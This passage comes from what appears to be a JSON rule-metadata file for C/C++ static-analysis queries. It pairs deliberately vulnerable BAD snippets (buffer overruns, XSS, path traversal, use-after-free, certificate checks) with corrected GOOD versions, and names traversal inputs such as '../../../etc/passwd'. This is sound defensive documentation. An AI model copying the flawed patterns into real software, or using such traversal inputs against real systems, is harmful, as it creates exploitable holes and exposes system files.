    "help": "# Dangerous use of transformation after operation.\nSearch for places where the result of the multiplication is subjected to explicit conversion, not the arguments. Therefore, during the multiplication period, you can lose meaningful data.\n\n\n## Example\nThe following example demonstrates erroneous and fixed methods for working with type conversion.\n\n\n```cpp\n...\n  vUnsignedLong = (unsigned long)(vUnsignedInt*vUnsignedInt); // BAD\n...\n  vUnsignedLong = ((unsigned long)vUnsignedInt*vUnsignedInt); // GOOD\n...\n\n```\n\n## References\n* CERT C Coding Standard: [INT30-C. Ensure that unsigned integer operations do not wrap](https://wiki.sei.cmu.edu/confluence/display/c/INT30-C.+Ensure+that+unsigned+integer+operations+do+not+wrap).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n"
  },
  "cpp/errors-after-refactoring": {
    "name": "Errors After Refactoring",
    "description": "--In some situations, after code refactoring, parts of the old constructs may remain. --They are correctly accepted by the compiler, but can critically affect program execution. --For example, if you switch from `do {...} while ();` to `while () {...}` with errors, you run the risk of running out of resources. --These code snippets look suspicious and require the developer's attention.",
    "kind": "problem",
    "id": "cpp/errors-after-refactoring",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-691"
    ],
    "filename": "4c75f1a4-InsufficientControlFlowManagementAfterRefactoringTheCode",
    "language": "cpp",
    "help": "# Errors After Refactoring\nIn some situations, after code refactoring, parts of the old constructs may remain. They are correctly accepted by the compiler, but can critically affect program execution. For example, if you switch from \\`do {...} while ();\\` to \\`while () {...}\\` forgetting to remove the old construct completely, you get \\`while(){...}while();\\` which may be vulnerable. These code snippets look suspicious and require the developer's attention.\n\n\n## Recommendation\nWe recommend that you use more explicit code transformations.\n\n\n## Example\nThe following example demonstrates the erroneous and corrected sections of the code.\n\n\n```c\nwhile(flagsLoop)\n{\n  ...\n  if(flagsIf) break;\n  ...\n}while(flagsLoop); // BAD: when exiting through `break`, it is possible to get into an eternal loop.\n...\nwhile(flagsLoop)\n{\n  ...\n  if(flagsIf) break;\n  ...\n} // GOOD: correct cycle\n...\nif(intA+intB) return 1; // BAD: possibly no comparison\n...\nif(intA+intB>intC) return 1; // GOOD: correct comparison\n\n```\n\n## References\n* CWE Common Weakness Enumeration: [ CWE-691: Insufficient Control Flow Management](https://cwe.mitre.org/data/definitions/691.html).\n* Common Weakness Enumeration: [CWE-691](https://cwe.mitre.org/data/definitions/691.html).\n"
  },
  "cpp/dangerous-use-of-exception-blocks": {
    "name": "Dangerous use of exception blocks.",
    "description": "When clearing the data in the catch block, you must be sure that the memory was allocated before the exception.",
    "kind": "problem",
    "id": "cpp/dangerous-use-of-exception-blocks",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-476",
      "external/cwe/cwe-415"
    ],
    "filename": "86dc610a-DangerousUseOfExceptionBlocks",
    "language": "cpp",
    "help": "# Dangerous use of exception blocks.\nWhen releasing memory in a catch block, be sure that the memory was allocated and has not already been released.\n\n\n## Example\nThe following example shows erroneous and fixed ways to use exception handling.\n\n\n```cpp\n...\ntry {\n  if (checkValue) throw exception();\n  bufMyData =  new myData*[sizeInt];\n\t \n  } \n  catch (...) \n  {\n    for (size_t i = 0; i < sizeInt; i++)\n    {\n    \tdelete[] bufMyData[i]->buffer; // BAD\n        delete bufMyData[i];\n    }\n...\ntry {\n  if (checkValue) throw exception();\n  bufMyData =  new myData*[sizeInt];\n\t \n  } \n  catch (...) \n  {\n    for (size_t i = 0; i < sizeInt; i++)\n    {\n      if(bufMyData[i])\n      {\n    \tdelete[] bufMyData[i]->buffer; // GOOD\n        delete bufMyData[i];\n      }\n    }\n\n...\n  catch (const exception &) {\n\t  delete valData;\n\t  throw;\n  }\n  catch (...) \n  {\n    delete valData; // BAD\n...\n  catch (const exception &) {\n\t  delete valData;\n    valData = NULL;\n\t  throw;\n  }\n  catch (...) \n  {\n    delete valData; // GOOD  \n...\n\n```\n\n## References\n* CERT C Coding Standard: [EXP34-C. Do not dereference null pointers](https://wiki.sei.cmu.edu/confluence/display/c/EXP34-C.+Do+not+dereference+null+pointers).\n* Common Weakness Enumeration: [CWE-476](https://cwe.mitre.org/data/definitions/476.html).\n* Common Weakness Enumeration: [CWE-415](https://cwe.mitre.org/data/definitions/415.html).\n"
  },
  "cpp/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073"
    ],
    "filename": "57f2ed4d-TaintedPath",
    "language": "cpp",
    "help": "# Uncontrolled data used in path expression\nAccessing paths controlled by users can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nPaths that are naively constructed from data controlled by a user may be absolute paths, or may contain unexpected special characters such as \"..\". Such a path could point anywhere on the file system.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nCommon validation methods include checking that the normalized path is relative and does not contain any \"..\" components, or checking that the path is contained within a safe folder. The method you should use depends on how the path is used in the application, and whether the path should be a single path component.\n\nIf the path should be a single path component (such as a file name), you can check for the existence of any path separators (\"/\" or \"\\\\\"), or \"..\" sequences in the input, and reject the input if any are found.\n\nNote that removing \"../\" sequences is *not* sufficient, since the input could still contain a path separator followed by \"..\". For example, the input \".../...//\" would still result in the string \"../\" if only \"../\" sequences are removed.\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn this example, a file name is read from a user and then used to access a file. However, a malicious user could enter a file name anywhere on the file system, such as \"/etc/passwd\" or \"../../../etc/passwd\".\n\n\n```c\nint main(int argc, char** argv) {\n  char *userAndFile = argv[2];\n  \n  {\n    char fileBuffer[PATH_MAX];\n    snprintf(fileBuffer, sizeof(fileBuffer), \"/home/%s\", userAndFile);\n    // BAD: a string from the user is used in a filename\n    fopen(fileBuffer, \"wb+\");\n  }\n}\n\n```\nIf the input should only be a file name, you can check that it doesn't contain any path separators or \"..\" sequences.\n\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv) {\n    char *fileName = argv[2];\n    // Check for invalid sequences in the user input\n    if (strstr(fileName , \"..\") || strchr(fileName , '/') || strchr(fileName , '\\\\')) {\n        printf(\"Invalid filename.\\n\");\n        return 1;\n    }\n\n    char fileBuffer[PATH_MAX];\n    snprintf(fileBuffer, sizeof(fileBuffer), \"/home/user/files/%s\", fileName);\n    // GOOD: We know that the filename is safe and stays within the public folder\n    FILE *file = fopen(fileBuffer, \"wb+\");\n}\n```\nIf the input should be within a specific directory, you can check that the resolved path is still contained within that directory.\n\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv) {\n    char *userAndFile = argv[2];\n    const char *baseDir = \"/home/user/public/\";\n    char fullPath[PATH_MAX];\n\n    // Attempt to concatenate the base directory and the user-supplied path\n    snprintf(fullPath, sizeof(fullPath), \"%s%s\", baseDir, userAndFile);\n\n    // Resolve the absolute path, normalizing any \"..\" or \".\"\n    char *resolvedPath = realpath(fullPath, NULL);\n    if (resolvedPath == NULL) {\n        perror(\"Error resolving path\");\n        return 1;\n    }\n\n    // Check if the resolved path starts with the base directory\n    if (strncmp(baseDir, resolvedPath, strlen(baseDir)) != 0) {\n        free(resolvedPath);\n        return 1;\n    }\n\n    // GOOD: Path is within the intended directory\n    FILE *file = fopen(resolvedPath, \"wb+\");\n    free(resolvedPath);\n}\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Linux man pages: [realpath(3)](https://man7.org/linux/man-pages/man3/realpath.3.html).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "cpp/arithmetic-with-extreme-values": {
    "name": "Use of extreme values in arithmetic expression",
    "description": "If a variable is assigned the maximum or minimum value for that variable's type and is then used in an arithmetic expression, this may result in an overflow.",
    "kind": "problem",
    "id": "cpp/arithmetic-with-extreme-values",
    "problem.severity": "warning",
    "security-severity": 8.6,
    "precision": "low",
    "tags": [
      "security",
      "reliability",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "d81e4b10-ArithmeticWithExtremeValues",
    "language": "cpp",
    "help": "# Use of extreme values in arithmetic expression\nAssigning the maximum or minimum value for a type to a variable of that type and then using the variable in calculations may cause overflows.\n\n\n## Recommendation\nBefore using the variable, ensure that it is reassigned a value that does not cause an overflow, or use a wider type to do the arithmetic.\n\n\n## Example\nIn this example, assigning `INT_MAX` to a variable and adding one causes an overflow. However, casting to a `long` beforehand ensures that the arithmetic is done in the wider type, and so does not overflow.\n\n\n```c\nint main(int argc, char** argv) {\n\tint i = INT_MAX;\n\t// BAD: overflow\n\tint j = i + 1;\n\n\t// ...\n\n\tint l = INT_MAX;\n\t// GOOD: no overflow\n\tlong k = (long)l + 1;\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "cpp/count-untrusted-data-external-api-ir": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "cpp/count-untrusted-data-external-api-ir",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "ce4f8673-IRCountUntrustedDataToExternalAPI",
    "language": "cpp",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a call to a function that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the C++ standard library, third party dependencies or from internal dependencies. The query will report the function name, along with either `[param x]`, where `x` indicates the position of the parameter receiving the untrusted data or `[qualifier]` indicating the untrusted data is used as the qualifier to the function call.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIFunction` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIf the query were to return the API `fputs [param 1]` then we should first consider whether this a security relevant sink. In this case, this is writing to a `FILE*`, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the XSS query.\n\nIf the query were to return the API `strcat [param 1]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 1st argument to the 0th argument of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "cpp/overrunning-write-with-float": {
    "name": "Potentially overrunning write with float to string conversion",
    "description": "Buffer write operations that do not control the length of data written may overflow when floating point inputs take extreme values.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/overrunning-write-with-float",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-120",
      "external/cwe/cwe-787",
      "external/cwe/cwe-805"
    ],
    "filename": "43f650fa-OverrunWriteFloat",
    "language": "cpp",
    "help": "# Potentially overrunning write with float to string conversion\nThe program performs a buffer copy or write operation that includes one or more float to string conversions (i.e. the %f format specifier), which may overflow the destination buffer if extreme inputs are given. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nAlways control the length of buffer copy and buffer write operations. `strncpy` should be used over `strcpy`, `snprintf` over `sprintf`, and in other cases 'n-variant' functions should be preferred.\n\n\n## Example\n\n```c\nvoid displayValue(double value)\n{\n\tchar buffer[256];\n\n\t// BAD: extreme values may overflow the buffer\n\tsprintf(buffer, \"%f\", value);\n\n\tMessageBox(hWnd, buffer, \"A Number\", MB_OK);\n}\n```\nIn this example, the call to `sprintf` contains a `%f` format specifier. Though a 256 character buffer has been allowed, it is not sufficient for the most extreme floating point inputs. For example the representation of double value 1e304 (that is 1 with 304 zeroes after it) will overflow a buffer of this length.\n\nTo fix this issue three changes should be made:\n\n* Control the size of the buffer using a preprocessor define.\n* Replace the call to `sprintf` with `snprintf`, specifying the define as the maximum length to copy. This will prevent the buffer overflow.\n* Consider using the `%g` format specifier instead of `%f`.\n\n## References\n* CERT C Coding Standard: [STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* CERT C++ Coding Standard: [STR50-CPP. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/cplusplus/STR50-CPP.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/potentially-dangerous-function": {
    "name": "Use of potentially dangerous function",
    "description": "Use of a standard library function that is not thread-safe.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 10.0,
    "precision": "medium",
    "id": "cpp/potentially-dangerous-function",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-676"
    ],
    "filename": "122e8bb7-PotentiallyDangerousFunction",
    "language": "cpp",
    "help": "# Use of potentially dangerous function\nThis rule finds calls to functions that are dangerous to use. Currently, it checks for calls to `gmtime`, `localtime`, `ctime` and `asctime`.\n\nThe time related functions such as `gmtime` fill data into a `tm` struct or `char` array in shared memory and then returns a pointer to that memory. If the function is called from multiple places in the same program, and especially if it is called from multiple threads in the same program, then the calls will overwrite each other's data.\n\n\n## Recommendation\nReplace calls to `gmtime` with `gmtime_r`. With `gmtime_r`, the application code manages allocation of the `tm` struct. That way, separate calls to the function can use their own storage.\n\nSimilarly replace calls to `localtime` with `localtime_r`, calls to `ctime` with `ctime_r` and calls to `asctime` with `asctime_r` (if those functions exist on your platform).\n\n\n## Example\nThe following example checks the local time in two ways:\n\n\n```c\n// BAD: using gmtime\nint is_morning_bad() {\n    const time_t now_seconds = time(NULL);\n    struct tm *now = gmtime(&now_seconds);\n    return (now->tm_hour < 12);\n}\n\n// GOOD: using gmtime_r\nint is_morning_good() {\n    const time_t now_seconds = time(NULL);\n    struct tm now;\n    gmtime_r(&now_seconds, &now);\n    return (now.tm_hour < 12);\n}\n\n```\nThe first version uses `gmtime`, so it is vulnerable to its data being overwritten by another thread. Even if this code is not used in a multi-threaded context right now, future changes may make the program multi-threaded. The second version of the code uses `gmtime_r`. Since it allocates a new `tm` struct on every call, it is immune to other calls to `gmtime` or `gmtime_r`.\n\n\n## References\n* SEI CERT C Coding Standard: [CON33-C. Avoid race conditions when using library functions](https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions).\n* Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).\n"
  },
  "cpp/cgi-xss": {
    "name": "CGI script vulnerable to cross-site scripting",
    "description": "Writing user input directly to a web page allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "cpp/cgi-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079"
    ],
    "filename": "fd352955-CgiXss",
    "language": "cpp",
    "help": "# CGI script vulnerable to cross-site scripting\nDirectly writing an HTTP request parameter back to a web page allows for a cross-site scripting vulnerability. The data is displayed in a user's web browser as belonging to one site, but it is provided by some other site that the user browses to. In effect, such an attack allows one web site to insert content in the other one.\n\nFor web servers implemented with the Common Gateway Interface (CGI), HTTP parameters are supplied via the `QUERY_STRING` environment variable.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider escaping special characters before writing the HTTP parameter back to the page.\n\n\n## Example\nIn the following example, the `bad_server` writes a parameter directly back to the HTML page that the user will see. The `good_server` first escapes any HTML special characters before writing to the HTML page.\n\n\n```c\nvoid bad_server() {\n  char* query = getenv(\"QUERY_STRING\");\n  puts(\"<p>Query results for \");\n  // BAD: Printing out an HTTP parameter with no escaping\n  puts(query);\n  puts(\"\\n<p>\\n\");\n  puts(do_search(query));\n}\n\nvoid good_server() {\n  char* query = getenv(\"QUERY_STRING\");\n  puts(\"<p>Query results for \");\n  // GOOD: Escape HTML characters before adding to a page\n  char* query_escaped = escape_html(query);\n  puts(query_escaped);\n  free(query_escaped);\n\n  puts(\"\\n<p>\\n\");\n  puts(do_search(query));\n}\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* IETF Tools: [The Common Gateway Specification (CGI)](http://tools.ietf.org/html/draft-robinson-www-interface-00).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "cpp/untrusted-data-to-external-api": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "cpp/untrusted-data-to-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "ce4f8673-UntrustedDataToExternalAPI",
    "language": "cpp",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered, so you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a call to a function that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the C++ standard library, third-party dependencies or from internal dependencies. The query reports uses of untrusted data in either the qualifier or as one of the arguments of external APIs.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIFunction` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, input is read from `fgets` and then ultimately used in a call to the `fputs` external API:\n\n\n```cpp\n#include <cstdio>\n\nvoid do_get(FILE* request, FILE* response) {\n  char page[1024];\n  fgets(page, 1024, request);\n\n  char buffer[1024];\n  strcat(buffer, \"The page \\\"\");\n  strcat(buffer, page);\n  strcat(buffer, \"\\\" was not found.\");\n\n  fputs(buffer, response);\n}\n```\nThis is an XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from `fgets`.\n\n\n```cpp\n#include <cstdio>\n\nvoid do_get(FILE* request, FILE* response) {\n  char user_id[1024];\n  fgets(user_id, 1024, request);\n\n  char buffer[1024];\n  strcat(buffer, \"SELECT * FROM user WHERE user_id='\");\n  strcat(buffer, user_id);\n  strcat(buffer, \"'\");\n\n  // ...\n}\n```\nIf the query reported the call to `strcat` on line 9, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems likely that `buffer` will be executed as an SQL query, potentially leading to an SQL injection vulnerability.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "cpp/overrun-write": {
    "name": "Overrunning write",
    "description": "Exceeding the size of a static array during write or access operations may result in a buffer overflow.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/overrun-write",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-119",
      "external/cwe/cwe-131"
    ],
    "filename": "e51e4b29-OverrunWriteProductFlow",
    "language": "cpp",
    "help": "# Overrunning write\nYou must ensure that you do not exceed the size of an allocation during write and read operations. If an operation attempts to write to or access an element that is outside the range of the allocation then this results in a buffer overflow. Buffer overflows can lead to anything from a segmentation fault to a security vulnerability.\n\n\n## Recommendation\nCheck the offsets and sizes used in the highlighted operations to ensure that a buffer overflow will not occur.\n\n\n## Example\n\n```cpp\nint f(char * s, unsigned size) {\n\tchar* buf = (char*)malloc(size);\n\n\tstrncpy(buf, s, size + 1); // wrong: copy may exceed size of buf\n\n\tfor (int i = 0; i <= size; i++) { // wrong: upper limit that is higher than size of buf\n\t\tcout << buf[i];\n\t}\n}\n\n```\n\n## References\n* I. Gerg. *An Overview and Example of the Buffer-Overflow Exploit*. IANewsletter vol 7 no 4. 2005.\n* M. Donaldson. *Inside the Buffer Overflow Attack: Mechanism, Method &amp; Prevention*. SANS Institute InfoSec Reading Room. 2002.\n* Common Weakness Enumeration: [CWE-119](https://cwe.mitre.org/data/definitions/119.html).\n* Common Weakness Enumeration: [CWE-131](https://cwe.mitre.org/data/definitions/131.html).\n"
  },
  "cpp/dangerous-use-convert-function": {
    "name": "Dangerous use convert function.",
    "description": "Using convert function with an invalid length argument can result in an out-of-bounds access error or unexpected result.",
    "kind": "problem",
    "id": "cpp/dangerous-use-convert-function",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-125"
    ],
    "filename": "aa8ad4d3-DangerousWorksWithMultibyteOrWideCharacters",
    "language": "cpp",
    "help": "# Dangerous use convert function.\nUsing a function to convert multibyte or wide characters with an invalid length argument may result in an out-of-range access error or unexpected results.\n\n\n## Example\nThe following example shows the erroneous and corrected method of using function mbtowc.\n\n\n```cpp\n\n...\nmbtowc(&wc, ptr, 4)); // BAD:we can get unpredictable results\n...\nmbtowc(&wc, ptr, MB_LEN_MAX); // GOOD\n...\n\n```\n\n## References\n* CERT Coding Standard: [ARR30-C. Do not form or use out-of-bounds pointers or array subscripts - SEI CERT C Coding Standard - Confluence](https://wiki.sei.cmu.edu/confluence/display/c/ARR30-C.+Do+not+form+or+use+out-of-bounds+pointers+or+array+subscripts).\n* Common Weakness Enumeration: [CWE-125](https://cwe.mitre.org/data/definitions/125.html).\n"
  },
  "cpp/certificate-result-conflation": {
    "name": "Certificate result conflation",
    "description": "Only accept SSL certificates that pass certificate verification.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/certificate-result-conflation",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "126b18b9-SSLResultConflation",
    "language": "cpp",
    "help": "# Certificate result conflation\nWhen checking the result of SSL certificate verification, accepting any error code may allow an attacker to impersonate someone who is trusted.\n\n\n## Recommendation\nWhen checking an SSL certificate with `SSL_get_verify_result`, only `X509_V_OK` is a success code. If there is any other result the certificate should not be accepted.\n\n\n## Example\nIn this example the error code `X509_V_ERR_CERT_HAS_EXPIRED` is treated the same as an OK result. An expired certificate should not be accepted as it is more likely to be compromised than a valid certificate.\n\n\n```cpp\n// ...\n\nif (cert = SSL_get_peer_certificate(ssl))\n{\n\tresult = SSL_get_verify_result(ssl);\n\n\tif ((result == X509_V_OK) || (result == X509_V_ERR_CERT_HAS_EXPIRED)) // BAD (conflates OK and a non-OK codes)\n\t{\n\t\tdo_ok();\n\t} else {\n\t\tdo_error();\n\t}\n}\n\n```\nIn the corrected example, only a result of `X509_V_OK` is accepted.\n\n\n```cpp\n// ...\n\nif (cert = SSL_get_peer_certificate(ssl))\n{\n\tresult = SSL_get_verify_result(ssl);\n\n\tif (result == X509_V_OK) // GOOD\n\t{\n\t\tdo_ok();\n\t} else {\n\t\tdo_error();\n\t}\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "cpp/dangerous-cin": {
    "name": "Dangerous use of 'cin'",
    "description": "Using `cin` without specifying the length of the input may be dangerous.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 10.0,
    "precision": "high",
    "id": "cpp/dangerous-cin",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-676"
    ],
    "filename": "122e8bb7-DangerousUseOfCin",
    "language": "cpp",
    "help": "# Dangerous use of 'cin'\nThis rule finds calls to `std::istream::operator>>` on `std::cin` without a preceding call to `cin.width`. Consuming input from `cin` without specifying the length of the input is dangerous due to the possibility of buffer overflows.\n\n\n## Recommendation\nAlways specify the length of any input expected from `cin` by calling `cin.width` before consuming the input.\n\n\n## Example\nThe following example shows both a dangerous and a safe way to consume input from `cin`.\n\n\n```cpp\n#define BUFFER_SIZE 20\n\nvoid bad()\n{\n\tchar buffer[BUFFER_SIZE];\n\t// BAD: Use of 'cin' without specifying the length of the input.\n\tcin >> buffer;\n\tbuffer[BUFFER_SIZE-1] = '\\0';\n}\n\nvoid good()\n{\n\tchar buffer[BUFFER_SIZE];\n\t// GOOD: Specifying the length of the input before using 'cin'.\n\tcin.width(BUFFER_SIZE);\n\tcin >> buffer;\n\tbuffer[BUFFER_SIZE-1] = '\\0';\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).\n"
  },
  "cpp/use-after-expired-lifetime": {
    "id": "cpp/use-after-expired-lifetime",
    "name": "Use of object after its lifetime has ended",
    "description": "Accessing an object after its lifetime has ended can result in security vulnerabilities and undefined behavior.",
    "kind": "problem",
    "precision": "medium",
    "problem.severity": "error",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-416"
    ],
    "filename": "83baa6d8-UseAfterExpiredLifetime",
    "language": "cpp",
    "help": "# Use of object after its lifetime has ended\nUsing an object after its lifetime has ended results in undefined behavior. When an object's lifetime has ended it relinquishes ownership of its resources and the memory it occupied may be reused for other purposes. If the object is accessed after its lifetime has ended, the program may crash or behave in unexpected ways.\n\n\n## Recommendation\nEnsure that no object is accessed after its lifetime has ended. Use RAII (\"Resource Acquisition Is Initialization\") to manage the lifetime of objects, and avoid manual memory management, if possible.\n\n\n## Example\nThe following two examples demonstrate common lifetime violations when working with the C++ standard library.\n\nThe `bad_call_c_api` function contains a use of an expired lifetime. First, a temporary object of type `std::string` is constructed, and a pointer to its internal buffer is stored in a local variable. Once the `c_str()` call returns, the temporary object is destroyed, and the memory pointed to by `p` is freed. Thus, any attempt to dereference `p` inside `c_api` will result in a use-after-free vulnerability. The `good_call_c_api` function contains a fixed version of the first example. The variable `hello` is declared as a local variable, and the pointer to its internal buffer is stored in `p`. The lifetime of hello outlives the call to `c_api`, so the pointer stored in `p` remains valid throughout the call to `c_api`.\n\n\n```cpp\nvoid c_api(const char*);\n\nvoid bad_call_c_api() {\n  // BAD: the memory returned by `c_str()` is freed when the temporary string is destroyed\n  const char* p = std::string(\"hello\").c_str();\n  c_api(p);\n}\n\nvoid good_call_c_api() {\n  // GOOD: the \"hello\" string outlives the pointer returned by `c_str()`, so it's safe to pass it to `c_api()`\n  std::string hello(\"hello\");\n  const char* p = hello.c_str();\n  c_api(p);\n}\n\n```\nThe `bad_remove_even_numbers` function demonstrates a potential issue with iterator invalidation. Each C++ standard library container comes with a specification of which operations invalidates iterators pointing into the container. For example, calling `erase` on an object of type `std::vector<T>` invalidates all its iterators, and thus any attempt to dereference the iterator can result in a use-after-free vulnerability. The `good_remove_even_numbers` function contains a fixd version of the third example. The `erase` function returns an iterator to the element following the last element removed, and this return value is used to ensure that `it` remains valid after the call to `erase`.\n\n\n```cpp\nvoid bad_remove_even_numbers(std::vector<int>& v) {\n    // BAD: the iterator is invalidated after the call to `erase`.\n  for(std::vector<int>::iterator it = v.begin(); it != v.end(); ++it) {\n    if(*it % 2 == 0) {\n      v.erase(it);\n    }\n  }\n}\n\nvoid good_remove_even_numbers(std::vector<int>& v) {\n  // GOOD: `erase` returns the iterator to the next element.\n  for(std::vector<int>::iterator it = v.begin(); it != v.end(); ) {\n    if(*it % 2 == 0) {\n      it = v.erase(it);\n    } else {\n      ++it;\n    }\n  }\n}\n```\n\n## References\n* CERT C Coding Standard: [MEM30-C. Do not access freed memory](https://wiki.sei.cmu.edu/confluence/display/c/MEM30-C.+Do+not+access+freed+memory).\n* OWASP: [Using freed memory](https://owasp.org/www-community/vulnerabilities/Using_freed_memory).\n* [Lifetime safety: Preventing common dangling](https://github.com/isocpp/CppCoreGuidelines/blob/master/docs/Lifetime.pdf)\n* [Containers library](https://en.cppreference.com/w/cpp/container)\n* [RAII](https://en.cppreference.com/w/cpp/language/raii)\n* Common Weakness Enumeration: 